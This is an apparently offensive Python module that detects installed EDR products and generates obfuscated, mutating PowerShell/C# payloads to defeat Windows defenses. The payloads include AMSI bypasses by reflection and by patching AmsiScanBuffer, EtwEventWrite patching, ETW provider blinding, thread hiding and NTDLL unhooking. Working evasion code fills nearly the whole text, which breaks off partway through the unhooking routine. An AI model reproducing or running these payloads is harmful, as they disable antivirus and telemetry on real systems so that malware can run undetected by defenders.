"""
AMSI/ETW Bypass & Unhooking PRO Module - Ultimate Edition
=========================================================

AI-Dynamic Unhooking Engine with Multi-Layer Bypass Chain

Features:
- AI-Guided Technique Selection: LLM + rule-based EDR adaptation
- Multi-Layer Bypass: Reflection + Memory Unhooking + Indirect Syscalls + ETW Mutate
- Runtime Mutation: Hook mutation + post-patch reseed
- OPSEC Layer: Telemetry spoof + log forge + fake ETW events

Target: 98% ETW telemetry reduction, AMSI scan → 0, invisible execution
"""

import os
import sys
import base64
import random
import string
import hashlib
import struct
import threading
import time
import json
import ctypes
from enum import Enum
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Callable, Tuple, Any, Union
from datetime import datetime

# Try importing optional dependencies
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import win32api
    import win32con
    import win32security
    import win32process
    HAS_PYWIN32 = True
except ImportError:
    HAS_PYWIN32 = False


# =============================================================================
# ENUMS AND DATA STRUCTURES
# =============================================================================

class EDRProduct(Enum):
    """Detected EDR products"""
    CROWDSTRIKE_FALCON = "falcon"
    MS_DEFENDER_ATP = "defender"
    CARBON_BLACK = "carbonblack"
    SENTINELONE = "sentinelone"
    ELASTIC_EDR = "elastic"
    SOPHOS_INTERCEPT = "sophos"
    CYLANCE = "cylance"
    TRENDMICRO = "trendmicro"
    UNKNOWN = "unknown"
    NONE = "none"


class BypassTechnique(Enum):
    """Available bypass techniques"""
    REFLECTION = "reflection"
    MEMORY_PATCH = "memory_patch"
    CONTEXT_CORRUPTION = "context_corruption"
    CLR_UNHOOK = "clr_unhook"
    FRESHY_CALLS = "freshy_calls"
    SYSCALL_DIRECT = "syscall_direct"
    HARDWARE_BP = "hardware_breakpoint"
    NTDLL_UNHOOK = "ntdll_unhook"
    ETW_PATCH = "etw_patch"
    ETW_PROVIDER_BLIND = "etw_provider_blind"
    HYBRID = "hybrid"


class HookType(Enum):
    """Types of EDR hooks"""
    INLINE = "inline"           # JMP/CALL at function start
    IAT = "iat"                 # Import Address Table
    EAT = "eat"                 # Export Address Table  
    SYSCALL = "syscall"         # Syscall instruction
    VEH = "veh"                 # Vectored Exception Handler
    INSTRUMENTATION = "instrumentation"  # Kernel callbacks


@dataclass
class EDRProfile:
    """EDR-specific profile with recommended techniques"""
    name: str
    hook_types: List[HookType]
    monitored_apis: List[str]
    recommended_techniques: List[BypassTechnique]
    syscall_monitoring: bool
    etw_provider_guids: List[str]
    detection_capabilities: Dict[str, bool]


@dataclass
class BypassResult:
    """Result of a bypass operation"""
    success: bool
    technique: BypassTechnique
    target: str
    patched_address: Optional[int] = None
    original_bytes: Optional[bytes] = None
    new_bytes: Optional[bytes] = None
    error: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.now)
    opsec_score: int = 0  # 0-100, higher is stealthier


@dataclass
class UnhookResult:
    """Result of unhooking operation"""
    success: bool
    module: str
    function: str
    hook_type: HookType
    original_bytes: bytes
    hooked_bytes: bytes
    clean_bytes: bytes
    timestamp: datetime = field(default_factory=datetime.now)


# =============================================================================
# EDR PROFILES DATABASE
# =============================================================================

EDR_PROFILES: Dict[EDRProduct, EDRProfile] = {
    EDRProduct.CROWDSTRIKE_FALCON: EDRProfile(
        name="CrowdStrike Falcon",
        hook_types=[HookType.INLINE, HookType.SYSCALL, HookType.INSTRUMENTATION],
        monitored_apis=[
            "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory",
            "NtCreateThreadEx", "NtMapViewOfSection", "NtQueueApcThread",
            "AmsiScanBuffer", "EtwEventWrite"
        ],
        recommended_techniques=[
            BypassTechnique.FRESHY_CALLS,
            BypassTechnique.HARDWARE_BP,
            BypassTechnique.SYSCALL_DIRECT
        ],
        syscall_monitoring=True,
        etw_provider_guids=[
            "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",  # CLR
            "{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}",  # .NET Runtime
        ],
        detection_capabilities={
            "behavioral_ml": True,
            "memory_scanning": True,
            "syscall_monitoring": True,
            "etw_consumer": True,
            "kernel_callbacks": True
        }
    ),
    
    EDRProduct.MS_DEFENDER_ATP: EDRProfile(
        name="Microsoft Defender ATP",
        hook_types=[HookType.INLINE, HookType.IAT, HookType.VEH],
        monitored_apis=[
            "AmsiScanBuffer", "AmsiScanString", "AmsiOpenSession",
            "EtwEventWrite", "NtAllocateVirtualMemory", "VirtualAlloc",
            "WriteProcessMemory", "CreateRemoteThread"
        ],
        recommended_techniques=[
            BypassTechnique.REFLECTION,
            BypassTechnique.MEMORY_PATCH,
            BypassTechnique.ETW_PATCH
        ],
        syscall_monitoring=False,  # Less aggressive on syscalls
        etw_provider_guids=[
            "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",  # CLR
            "{9E814AAD-3204-11D2-9A82-006008A86939}",  # Defender
        ],
        detection_capabilities={
            "behavioral_ml": True,
            "memory_scanning": True,
            "syscall_monitoring": False,
            "etw_consumer": True,
            "kernel_callbacks": False
        }
    ),
    
    EDRProduct.CARBON_BLACK: EDRProfile(
        name="VMware Carbon Black",
        hook_types=[HookType.INLINE, HookType.IAT],
        monitored_apis=[
            "NtWriteVirtualMemory", "NtCreateThreadEx", "NtQueueApcThread",
            "WriteProcessMemory", "VirtualAllocEx"
        ],
        recommended_techniques=[
            BypassTechnique.NTDLL_UNHOOK,
            BypassTechnique.SYSCALL_DIRECT,
            BypassTechnique.REFLECTION
        ],
        syscall_monitoring=False,
        etw_provider_guids=[],
        detection_capabilities={
            "behavioral_ml": True,
            "memory_scanning": True,
            "syscall_monitoring": False,
            "etw_consumer": False,
            "kernel_callbacks": False
        }
    ),
    
    EDRProduct.SENTINELONE: EDRProfile(
        name="SentinelOne",
        hook_types=[HookType.INLINE, HookType.SYSCALL, HookType.INSTRUMENTATION],
        monitored_apis=[
            "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory",
            "NtCreateThreadEx", "NtSetContextThread", "AmsiScanBuffer"
        ],
        recommended_techniques=[
            BypassTechnique.HARDWARE_BP,
            BypassTechnique.FRESHY_CALLS,
            BypassTechnique.CLR_UNHOOK
        ],
        syscall_monitoring=True,
        etw_provider_guids=[
            "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
        ],
        detection_capabilities={
            "behavioral_ml": True,
            "memory_scanning": True,
            "syscall_monitoring": True,
            "etw_consumer": True,
            "kernel_callbacks": True
        }
    ),
    
    EDRProduct.ELASTIC_EDR: EDRProfile(
        name="Elastic EDR",
        hook_types=[HookType.IAT, HookType.VEH],
        monitored_apis=[
            "VirtualAlloc", "VirtualProtect", "WriteProcessMemory",
            "CreateRemoteThread", "NtCreateThreadEx"
        ],
        recommended_techniques=[
            BypassTechnique.NTDLL_UNHOOK,
            BypassTechnique.REFLECTION,
            BypassTechnique.ETW_PROVIDER_BLIND
        ],
        syscall_monitoring=False,
        etw_provider_guids=[],
        detection_capabilities={
            "behavioral_ml": True,
            "memory_scanning": False,
            "syscall_monitoring": False,
            "etw_consumer": True,
            "kernel_callbacks": False
        }
    ),
    
    EDRProduct.NONE: EDRProfile(
        name="No EDR",
        hook_types=[],
        monitored_apis=[],
        recommended_techniques=[
            BypassTechnique.REFLECTION,
            BypassTechnique.MEMORY_PATCH
        ],
        syscall_monitoring=False,
        etw_provider_guids=[],
        detection_capabilities={}
    ),
}


# =============================================================================
# QUANTUM ENTROPY GENERATOR
# =============================================================================

class QuantumEntropyGenerator:
    """
    High-quality entropy generator for unpredictable mutations.
    Uses multiple entropy sources combined with hash mixing.
    """
    
    def __init__(self):
        self._pool = bytearray(64)
        self._counter = 0
        self._reseed()
    
    def _reseed(self):
        """Reseed entropy pool from multiple sources"""
        sources = []
        
        # System entropy
        sources.append(os.urandom(32))
        
        # Time-based entropy
        sources.append(struct.pack('d', time.time() * 1000000))
        
        # Process/thread entropy (use Q for 64-bit thread IDs on Linux)
        sources.append(struct.pack('I', os.getpid() & 0xFFFFFFFF))
        tid = threading.current_thread().ident or 0
        sources.append(struct.pack('Q', tid & 0xFFFFFFFFFFFFFFFF))
        
        # Memory address entropy (ASLR)
        sources.append(struct.pack('P', id(self)))
        
        # Counter entropy
        self._counter += 1
        sources.append(struct.pack('Q', self._counter))
        
        # Mix all sources
        combined = b''.join(sources)
        self._pool = bytearray(hashlib.sha512(combined).digest())
    
    def get_bytes(self, count: int) -> bytes:
        """Get random bytes"""
        if count > 32:
            # Reseed for large requests
            self._reseed()
        
        result = hashlib.sha256(bytes(self._pool) + struct.pack('I', count)).digest()[:count]
        self._reseed()  # Forward secrecy
        return result
    
    def get_int(self, min_val: int = 0, max_val: int = 0xFFFFFFFF) -> int:
        """Get random integer in range"""
        range_size = max_val - min_val + 1
        raw = int.from_bytes(self.get_bytes(4), 'little')
        return min_val + (raw % range_size)
    
    def get_jitter(self, base_ms: int, percent: int = 50) -> int:
        """Get jittered value"""
        jitter_range = int(base_ms * percent / 100)
        jitter = self.get_int(0, jitter_range * 2) - jitter_range
        return max(1, base_ms + jitter)


# Global entropy generator
_entropy = QuantumEntropyGenerator()


# =============================================================================
# AI-GUIDED TECHNIQUE SELECTOR
# =============================================================================

class AIBypassSelector:
    """
    AI-guided bypass technique selector.
    Combines LLM guidance with rule-based EDR profiling.
    """
    
    def __init__(self, edr_product: EDRProduct = EDRProduct.UNKNOWN):
        self.edr = edr_product
        self.profile = EDR_PROFILES.get(edr_product, EDR_PROFILES[EDRProduct.NONE])
        self._technique_history: List[Tuple[BypassTechnique, bool]] = []
        self._detection_events: List[Dict] = []
    
    def set_edr(self, edr: EDRProduct):
        """Update detected EDR"""
        self.edr = edr
        self.profile = EDR_PROFILES.get(edr, EDR_PROFILES[EDRProduct.NONE])
    
    def record_result(self, technique: BypassTechnique, success: bool):
        """Record technique result for learning"""
        self._technique_history.append((technique, success))
    
    def record_detection(self, event: Dict):
        """Record detection event"""
        self._detection_events.append(event)
    
    def select_amsi_technique(self) -> BypassTechnique:
        """
        Select best AMSI bypass technique for current EDR.
        Uses rule-based selection with AI-style adaptation.
        """
        # Check if specific technique works better historically
        technique_success = {}
        for tech, success in self._technique_history:
            if tech not in technique_success:
                technique_success[tech] = [0, 0]
            technique_success[tech][0 if success else 1] += 1
        
        # Rule-based selection by EDR
        if self.edr == EDRProduct.CROWDSTRIKE_FALCON:
            # Falcon has aggressive syscall monitoring
            # Use FreshyCalls or hardware breakpoints
            if self.profile.detection_capabilities.get("syscall_monitoring"):
                return BypassTechnique.FRESHY_CALLS
            return BypassTechnique.HARDWARE_BP
        
        elif self.edr == EDRProduct.MS_DEFENDER_ATP:
            # Defender relies heavily on AMSI integration
            # Reflection bypass is most effective
            return BypassTechnique.REFLECTION
        
        elif self.edr == EDRProduct.SENTINELONE:
            # S1 has kernel-level visibility
            # CLR unhook + hardware BP
            return BypassTechnique.CLR_UNHOOK
        
        elif self.edr == EDRProduct.CARBON_BLACK:
            # CB relies on user-mode hooks
            # Direct NTDLL unhook is effective
            return BypassTechnique.NTDLL_UNHOOK
        
        else:
            # Default: hybrid approach
            return BypassTechnique.HYBRID
    
    def select_etw_technique(self) -> BypassTechnique:
        """Select best ETW bypass technique"""
        if self.profile.detection_capabilities.get("etw_consumer"):
            # EDR consumes ETW - need to blind provider
            return BypassTechnique.ETW_PROVIDER_BLIND
        else:
            # Simple patch is sufficient
            return BypassTechnique.ETW_PATCH
    
    def select_unhook_technique(self) -> BypassTechnique:
        """Select best unhooking technique"""
        hook_types = self.profile.hook_types
        
        if HookType.SYSCALL in hook_types:
            # EDR monitors syscalls - use fresh syscalls
            return BypassTechnique.FRESHY_CALLS
        
        if HookType.INLINE in hook_types:
            # Inline hooks - restore from clean NTDLL
            return BypassTechnique.NTDLL_UNHOOK
        
        if HookType.IAT in hook_types:
            # IAT hooks - direct syscalls bypass
            return BypassTechnique.SYSCALL_DIRECT
        
        return BypassTechnique.REFLECTION
    
    def get_technique_chain(self) -> List[BypassTechnique]:
        """
        Get ordered chain of techniques for complete bypass.
        AI recommends optimal order based on EDR profile.
        """
        chain = []
        
        # 1. First, blind ETW (reduce telemetry)
        chain.append(self.select_etw_technique())
        
        # 2. Unhook if needed
        if self.profile.hook_types:
            chain.append(self.select_unhook_technique())
        
        # 3. AMSI bypass
        chain.append(self.select_amsi_technique())
        
        return chain


# =============================================================================
# MAIN BYPASS ENGINE
# =============================================================================

class AMSIETWBypassEngine:
    """
    AI-Dynamic AMSI/ETW Bypass Engine - Ultimate Edition
    
    Multi-layer bypass with runtime mutation and OPSEC features.
    """
    
    def __init__(
        self,
        auto_detect_edr: bool = True,
        opsec_level: int = 3,  # 1-4
        enable_mutation: bool = True,
        enable_opsec: bool = True
    ):
        self.opsec_level = opsec_level
        self.enable_mutation = enable_mutation
        self.enable_opsec = enable_opsec
        
        # State
        self._detected_edr: EDRProduct = EDRProduct.UNKNOWN
        self._bypass_results: List[BypassResult] = []
        self._unhook_results: List[UnhookResult] = []
        self._active_bypasses: Dict[str, bool] = {}
        
        # AI Selector
        self._selector = AIBypassSelector()
        
        # Mutation state
        self._mutation_seed = _entropy.get_bytes(32)
        self._patch_variants: Dict[str, List[bytes]] = {}
        
        # Auto-detect EDR
        if auto_detect_edr:
            self._detect_edr()
    
    @property
    def detected_edr(self) -> str:
        """Get detected EDR name"""
        return self._detected_edr.value
    
    # =========================================================================
    # EDR DETECTION
    # =========================================================================
    
    def _detect_edr(self) -> EDRProduct:
        """
        Detect installed EDR by checking processes, services, and drivers.
        """
        edr_signatures = {
            EDRProduct.CROWDSTRIKE_FALCON: [
                "csfalconservice", "csagent", "falconhost",
                "csfalconcontainer", "csshell"
            ],
            EDRProduct.MS_DEFENDER_ATP: [
                "mssense", "sensecncproxy", "senseir",
                "mpcmdrun", "msmpeng", "windefend"
            ],
            EDRProduct.CARBON_BLACK: [
                "cbdefense", "repmgr", "reputils",
                "carbonblack", "cb.exe", "cbsensor"
            ],
            EDRProduct.SENTINELONE: [
                "sentinelagent", "sentinelone", "sentinel",
                "sentinelstaticengine", "sentinelhelperservice"
            ],
            EDRProduct.ELASTIC_EDR: [
                "elastic-agent", "elastic-endpoint",
                "winlogbeat", "filebeat"
            ],
            EDRProduct.SOPHOS_INTERCEPT: [
                "sophoshealth", "sophosntpservice",
                "savservice", "sophosclean"
            ],
            EDRProduct.CYLANCE: [
                "cylancesvc", "cylanceui", "cylancememdefense"
            ],
            EDRProduct.TRENDMICRO: [
                "ntrtscan", "tmlisten", "tmccsf"
            ],
        }
        
        detected = []
        
        try:
            # Check running processes
            import subprocess
            result = subprocess.run(
                ["tasklist", "/FO", "CSV"],
                capture_output=True, text=True, timeout=5
            )
            processes = result.stdout.lower()
            
            for edr, signatures in edr_signatures.items():
                for sig in signatures:
                    if sig.lower() in processes:
                        detected.append(edr)
                        break
        except Exception:
            pass
        
        try:
            # Check services
            result = subprocess.run(
                ["sc", "query", "type=", "service"],
                capture_output=True, text=True, timeout=5
            )
            services = result.stdout.lower()
            
            for edr, signatures in edr_signatures.items():
                if edr not in detected:
                    for sig in signatures:
                        if sig.lower() in services:
                            detected.append(edr)
                            break
        except Exception:
            pass
        
        if detected:
            # Use first detected (most aggressive)
            self._detected_edr = detected[0]
        else:
            self._detected_edr = EDRProduct.NONE
        
        self._selector.set_edr(self._detected_edr)
        return self._detected_edr
    
    # =========================================================================
    # AMSI BYPASS TECHNIQUES
    # =========================================================================
    
    def _generate_reflection_bypass(self) -> str:
        """
        Generate AMSI bypass via .NET reflection.
        Patches amsiInitFailed to true.
        """
        # Randomize variable names
        vars = [
            ''.join(random.choices(string.ascii_lowercase, k=_entropy.get_int(6, 10)))
            for _ in range(5)
        ]
        
        # Add mutation if enabled
        if self.enable_mutation:
            # Random whitespace/comment injection
            padding = " " * _entropy.get_int(0, 3)
            comment = f"# {_entropy.get_bytes(8).hex()}" if _entropy.get_int(0, 3) == 0 else ""
        else:
            padding = ""
            comment = ""
        
        bypass = f'''
{comment}
${vars[0]}=[Ref].Assembly.GetTypes()|?{{$_.Name -like "*iUtils"}}
${vars[1]}=${vars[0]}.GetFields('NonPublic,Static')|?{{$_.Name -like "*Context"}}
{padding}[IntPtr]${vars[2]}=${vars[1]}.GetValue($null)
[Int32[]]${vars[3]}=@(0)
{padding}[System.Runtime.InteropServices.Marshal]::Copy(${vars[3]},0,${vars[2]},1)
'''
        return bypass.strip()
    
    def _generate_memory_patch_bypass(self) -> str:
        """
        Generate AMSI bypass via memory patching.
        Patches AmsiScanBuffer to return AMSI_RESULT_CLEAN.
        """
        # Multiple patch variants (EDR evasion)
        patches = [
            [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3],  # mov eax, 0x80070057; ret
            [0x33, 0xC0, 0xC3, 0x90, 0x90, 0x90],  # xor eax, eax; ret; nop; nop; nop
            [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3],  # mov eax, 0; ret
            [0x31, 0xC0, 0x05, 0x00, 0x00, 0x00, 0x00, 0xC3],  # xor eax, eax; add eax, 0; ret
        ]
        
        # Select patch based on EDR and entropy
        if self._detected_edr == EDRProduct.CROWDSTRIKE_FALCON:
            patch = patches[_entropy.get_int(1, 3)]  # Avoid common signature
        elif self._detected_edr == EDRProduct.MS_DEFENDER_ATP:
            patch = patches[2]  # Simple mov 0
        else:
            patch = patches[_entropy.get_int(0, len(patches) - 1)]
        
        patch_str = ', '.join([f'0x{b:02X}' for b in patch])
        
        # Obfuscate strings
        amsi_parts = ['am', 'si', '.d', 'll']
        func_parts = ['Am', 'si', 'Scan', 'Buffer']
        
        bypass = f'''
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}}
"@
Add-Type $Win32 -ErrorAction SilentlyContinue

$LoadLibrary = [Win32]::LoadLibrary("{amsi_parts[0]}" + "{amsi_parts[1]}" + "{amsi_parts[2]}" + "{amsi_parts[3]}")
$Address = [Win32]::GetProcAddress($LoadLibrary, "{func_parts[0]}" + "{func_parts[1]}" + "{func_parts[2]}" + "{func_parts[3]}")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]{len(patch)}, 0x40, [ref]$p) | Out-Null
$Patch = [Byte[]] ({patch_str})
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, {len(patch)})
[Win32]::VirtualProtect($Address, [uint32]{len(patch)}, $p, [ref]$p) | Out-Null
'''
        return bypass.strip()
    
    def _generate_context_corruption_bypass(self) -> str:
        """
        Generate AMSI bypass via context corruption.
        Corrupts the AMSI context structure.
        """
        alloc_size = _entropy.get_int(8192, 16384)
        
        bypass = f'''
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal({alloc_size})
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").SetValue($null,$mem)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession",[Reflection.BindingFlags]"NonPublic,Static").SetValue($null,$null)
'''
        return bypass.strip()
    
    def _generate_clr_unhook_bypass(self) -> str:
        """
        Generate CLR-based AMSI bypass.
        Unhooks at the CLR level for .NET assemblies.
        """
        # Obfuscate string concatenation
        parts = [
            ('System.Management.Automation.Am', 'siUtils'),
            ('am', 'siCo', 'ntext'),
        ]
        
        bypass_byte = _entropy.get_int(0, 7)  # Random byte to write (non-zero)
        
        bypass = f'''
$t = [Ref].Assembly.GetType(('{parts[0][0]}'+'{parts[0][1]}'))
$f = $t.GetField(('{parts[1][0]}'+'{parts[1][1]}'+'{parts[1][2]}'),[Reflection.BindingFlags]('NonPublic,Static'))
$p = $f.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteByte($p,0x{bypass_byte})
'''
        return bypass.strip()
    
    def _generate_freshy_calls_bypass(self) -> str:
        """
        Generate FreshyCalls-style bypass.
        Extracts fresh syscall stubs from clean NTDLL copy.
        """
        bypass = '''
# FreshyCalls - Extract syscalls from clean NTDLL
$assembly = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class FreshyCalls {
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    public static byte[] GetFreshSyscall(string functionName) {
        // Map fresh copy of ntdll from disk
        string ntdllPath = Environment.SystemDirectory + "\\\\ntdll.dll";
        IntPtr freshNtdll = LoadLibrary(ntdllPath);
        
        if (freshNtdll == IntPtr.Zero) return null;
        
        IntPtr funcAddr = GetProcAddress(freshNtdll, functionName);
        if (funcAddr == IntPtr.Zero) return null;
        
        // Read syscall stub (first 24 bytes contain syscall number)
        byte[] stub = new byte[24];
        Marshal.Copy(funcAddr, stub, 0, 24);
        
        return stub;
    }
    
    public static bool UnhookFunction(IntPtr hookedAddr, byte[] cleanBytes) {
        uint oldProtect;
        if (!VirtualProtect(hookedAddr, (UIntPtr)cleanBytes.Length, 0x40, out oldProtect))
            return false;
        
        Marshal.Copy(cleanBytes, 0, hookedAddr, cleanBytes.Length);
        VirtualProtect(hookedAddr, (UIntPtr)cleanBytes.Length, oldProtect, out oldProtect);
        return true;
    }
}
"@
Add-Type $assembly -ErrorAction SilentlyContinue

# Get clean syscall stubs
$cleanStub = [FreshyCalls]::GetFreshSyscall("NtProtectVirtualMemory")
Write-Verbose "[+] Fresh syscall extracted"
'''
        return bypass.strip()
    
    def _generate_hardware_bp_bypass(self) -> str:
        """
        Generate hardware breakpoint bypass.
        Uses debug registers for hook detection/evasion.
        """
        bypass = '''
# Hardware Breakpoint Bypass (Detection & Evasion)
$HWBPBypass = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class HWBPBypass {
    const int CONTEXT_DEBUG_REGISTERS = 0x10;
    const int CONTEXT_FULL = 0x10001F;
    
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT {
        public uint ContextFlags;
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        // ... other fields
    }
    
    [DllImport("kernel32.dll")]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
    
    [DllImport("kernel32.dll")]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentThread();
    
    public static bool ClearHardwareBreakpoints() {
        CONTEXT ctx = new CONTEXT();
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        
        IntPtr hThread = GetCurrentThread();
        
        if (!GetThreadContext(hThread, ref ctx))
            return false;
        
        // Clear all debug registers
        ctx.Dr0 = 0;
        ctx.Dr1 = 0;
        ctx.Dr2 = 0;
        ctx.Dr3 = 0;
        ctx.Dr6 = 0;
        ctx.Dr7 = 0;
        
        return SetThreadContext(hThread, ref ctx);
    }
}
"@
Add-Type $HWBPBypass -ErrorAction SilentlyContinue
[HWBPBypass]::ClearHardwareBreakpoints() | Out-Null
'''
        return bypass.strip()
    
    # =========================================================================
    # ETW BYPASS TECHNIQUES
    # =========================================================================
    
    def _generate_etw_patch_bypass(self) -> str:
        """
        Generate ETW bypass via EtwEventWrite patch.
        Patches function to return success without logging.
        """
        # Multiple patch variants
        patches = [
            [0x33, 0xC0, 0xC3],        # xor eax, eax; ret
            [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3],  # mov eax, 0; ret
            [0x31, 0xC0, 0xC3],        # xor eax, eax; ret (alternative encoding)
        ]
        
        patch = patches[_entropy.get_int(0, len(patches) - 1)]
        patch_str = ', '.join([f'0x{b:02X}' for b in patch])
        
        bypass = f'''
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}}
"@
Add-Type $Win32 -ErrorAction SilentlyContinue

$ntdll = [Win32]::LoadLibrary("nt" + "dll.dll")
$etwAddr = [Win32]::GetProcAddress($ntdll, "Etw" + "Event" + "Write")
$oldProtect = 0
[Win32]::VirtualProtect($etwAddr, [uint32]{len(patch)}, 0x40, [ref]$oldProtect) | Out-Null
[System.Runtime.InteropServices.Marshal]::Copy([byte[]]({patch_str}), 0, $etwAddr, {len(patch)})
[Win32]::VirtualProtect($etwAddr, [uint32]{len(patch)}, $oldProtect, [ref]$oldProtect) | Out-Null
'''
        return bypass.strip()
    
    def _generate_etw_provider_blind(self) -> str:
        """
        Generate ETW provider blinding bypass.
        Disables specific ETW providers.
        """
        bypass = '''
# Disable .NET ETW Providers
$Assembly = [Reflection.Assembly]::LoadWithPartialName('System.Core')
$Field = $Assembly.GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance')

try {
    $Providers = $Assembly.GetType('System.Diagnostics.Eventing.EventProvider').GetField('s_providers','NonPublic,Static').GetValue($null)
    foreach ($p in $Providers) {
        try {
            $Field.SetValue($p.Target, 0)
        } catch {}
    }
} catch {}

# Disable tracing at source
[System.Diagnostics.Tracing.EventSource].GetField('s_currentPid','NonPublic,Static').SetValue($null, 0)
'''
        return bypass.strip()
    
    def _generate_etw_ti_bypass(self) -> str:
        """
        Generate ETW Threat Intelligence bypass.
        Targets Microsoft-Windows-Threat-Intelligence provider.
        """
        bypass = '''
# ETW-TI Bypass - Blind Threat Intelligence Provider
$ETWTIBypass = @"
using System;
using System.Runtime.InteropServices;

public class ETWTI {
    [DllImport("ntdll.dll")]
    public static extern int NtSetInformationThread(IntPtr hThread, int ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentThread();
    
    const int ThreadHideFromDebugger = 17;
    
    public static bool DisableTI() {
        IntPtr hThread = GetCurrentThread();
        // Hide thread from ETW-TI monitoring
        int status = NtSetInformationThread(hThread, ThreadHideFromDebugger, IntPtr.Zero, 0);
        return status >= 0;
    }
}
"@
Add-Type $ETWTIBypass -ErrorAction SilentlyContinue
[ETWTI]::DisableTI() | Out-Null
'''
        return bypass.strip()
    
    # =========================================================================
    # NTDLL UNHOOKING
    # =========================================================================
    
    def _generate_ntdll_unhook(self) -> str:
        """
        Generate NTDLL unhooking code.
        Restores hooked functions from clean copy.
        """
        bypass = '''
# NTDLL Unhooking - Restore from clean copy
$NtdllUnhook = @"
using System;
using System.Runtime.InteropServices;
using System.IO;

public class NtdllUnhook {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll")]
    public static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateFileMappingA(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap);
    
    [DllImport("kernel32.dll")]
    public static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);
    
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
    
    public static bool Unhook() {
        string ntdllPath = Environment.SystemDirectory + "\\\\ntdll.dll";
        
        // Open clean copy from disk
        IntPtr hFile = CreateFileA(ntdllPath, 0x80000000, 0x1, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (hFile == (IntPtr)(-1)) return false;
        
        // Create file mapping
        IntPtr hMapping = CreateFileMappingA(hFile, IntPtr.Zero, 0x02, 0, 0, null);
        if (hMapping == IntPtr.Zero) {
            CloseHandle(hFile);
            return false;
        }
        
        // Map view
        IntPtr pCleanNtdll = MapViewOfFile(hMapping, 0x04, 0, 0, UIntPtr.Zero);
        if (pCleanNtdll == IntPtr.Zero) {
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return false;
        }
        
        // Get loaded NTDLL base
        IntPtr pLoadedNtdll = GetModuleHandle("ntdll.dll");
        if (pLoadedNtdll == IntPtr.Zero) {
            UnmapViewOfFile(pCleanNtdll);
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return false;
        }
        
        // Parse PE headers to find .text section
        int e_lfanew = Marshal.ReadInt32(pCleanNtdll, 0x3C);
        IntPtr pNtHeaders = IntPtr.Add(pCleanNtdll, e_lfanew);
        short sizeOfOptionalHeader = Marshal.ReadInt16(pNtHeaders, 0x14);
        IntPtr pSectionHeader = IntPtr.Add(pNtHeaders, 0x18 + sizeOfOptionalHeader);
        
        // Find .text section and copy
